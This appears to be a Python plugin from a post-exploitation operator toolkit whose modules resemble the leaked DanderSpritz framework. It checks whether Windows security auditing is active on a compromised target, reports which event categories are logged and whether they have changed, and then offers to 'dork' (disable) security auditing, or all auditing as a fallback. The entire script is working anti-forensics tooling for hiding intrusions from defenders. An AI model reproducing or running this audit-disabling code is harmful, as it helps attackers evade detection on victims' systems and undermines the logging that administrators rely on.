
import ops
import ops.security.auditing
import ops.system.systemversion
from ops.pprint import pprint
import ops.survey
import datetime
import dsz.ui
from optparse import OptionParser

def main():
    parser = OptionParser()
    parser.add_option('--status-only', dest='statusonly', action='store_true', default=False, help="Only show status, don't prompt about dorking")
    parser.add_option('--maxage', dest='maxage', default='3600', help='Maximum age of auditing status information to use before re-running audit -status', type='int')
    (options, args) = parser.parse_args()
    if options.statusonly:
        ops.survey.print_header('Auditing status check, dorking will be later')
    else:
        ops.survey.print_header('Auditing dorking')
    last_status = ops.security.auditing.get_status(datetime.timedelta.max)
    audit_status = ops.security.auditing.get_status(datetime.timedelta(seconds=options.maxage))
    ops.survey.print_agestring(audit_status.dszobjage)
    sysver = ops.system.systemversion.get_os_version(maxage=datetime.timedelta(seconds=86400))
    logged_events = []
    if (not audit_status.status.audit_mode):
        ops.info('Auditing is not enabled on this machine')
    else:
        ops.warn('Auditing is enabled on this machine')
        logged_events = filter((lambda x: (x.audit_event_success or x.audit_event_failure)), audit_status.status.event)
        if (len(logged_events) > 0):
            if (sysver.versioninfo.major > 5):
                pprint(logged_events, dictorder=['subcategory', 'audit_event_success', 'audit_event_failure'], header=['Category', 'Success', 'Failure'])
            else:
                pprint(logged_events, dictorder=['categorynative', 'audit_event_success', 'audit_event_failure'], header=['Category', 'Success', 'Failure'])
        else:
            ops.info('But nothing is being logged')
    if ops.security.auditing.is_dorked():
        target_addrs = ops.project.getCPAddresses()
        audit_cmds = ops.cmd.get_filtered_command_list(cpaddrs=target_addrs, isrunning=True, goodwords=['audit', '-disable'])
        cur_cmd = ops.data.getDszObject(cmdid=audit_cmds[0])
        ops.warn(('Auditing is already dorked on this system.  See command %d from session %s' % (cur_cmd.commandmetadata.id, cur_cmd.commandmetadata.destination)))
    if (last_status is not None):
        if (audit_status.status.audit_mode != last_status.status.audit_mode):
            ops.warn('Auditing status has changed on this target! Was %s, is now %s', (last_status.status.audit_mode, audit_status.status.audit_mode))
            stamp = last_status.cache_timestamp
            ops.warn(('Date of prior status info was: %d-%d-%d %d:%d' % (stamp.year, stamp.month, stamp.day, stamp.hour, stamp.minute)))
        changes = []
        for i in range(len(last_status.status.event)):
            levent = last_status.status.event[i]
            cevent = audit_status.status.event[i]
            if ((levent.audit_event_success != cevent.audit_event_success) or (levent.audit_event_failure != cevent.audit_event_failure)):
                changes.append(cevent)
        if (len(changes) > 0):
            ops.warn('Event auditing status has changed on this target!  See below for details')
            if (sysver.versioninfo.major > 5):
                pprint(changes, dictorder=['subcategory', 'audit_event_success', 'audit_event_failure'], header=['Category', 'Success', 'Failure'])
            else:
                pprint(changes, dictorder=['categorynative', 'audit_event_success', 'audit_event_failure'], header=['Category', 'Success', 'Failure'])
    if options.statusonly:
        ops.info('The above is only being shown for informational purposes, you will be prompted about dorking later')
        return
    if (audit_status.status.audit_mode and (not ops.security.auditing.is_dorked()) and (len(logged_events) > 0)):
        do_dork = dsz.ui.Prompt('Do you want to dork security auditing?', True)
        if do_dork:
            dork_success = False
            (results, messages) = ops.security.auditing.dork_auditing(dork_types=['security'])
            if (len(results) < 1):
                raise Exception('Failed to run the command to try to disable auditing')
            res = results[0]
            if (res.commandmetadata.isrunning == 1):
                ops.info(('Security auditing dorked, do not stop command %d or you will lose your blessing' % res.commandmetadata.id))
            else:
                ops.error(('Dorking failed, see command %d for the reason.' % res.commandmetadata.id))
                ops.warn('Note: Before attempting to say yes to the following question, you should see why the first one failed.\n\tIf it was "Pattern match of code failed", trying again won\'t help.')
                dork_all = dsz.ui.Prompt('Do you want to try dorking ALL auditing?', False)
                if dork_all:
                    (results, messages) = ops.security.auditing.dork_auditing(dork_types=['all'])
                    if (len(results) < 1):
                        raise Exception('Failed to run the command to try to disable auditing')
                    res = results[0]
                    if (res.commandmetadata.isrunning == 1):
                        ops.info(('ALL auditing dorked, do not stop command %d or you will lose your blessing' % res.commandmetadata.id))
                    else:
                        ops.error(('Dorking failed, see command %d for the reason' % res.commandmetadata.id))
    elif (not audit_status.status.audit_mode):
        ops.info('Auditing is already off, no need to dork')
    elif (len(logged_events) == 0):
        ops.info("Nothing is actually being audited, shouldn't need to dork")
    else:
        ops.info('Auditing is already dorked, not going to try a second time')
if ((__name__ == '__main__') or (__name__ == ops.survey.PLUGIN)):
    main()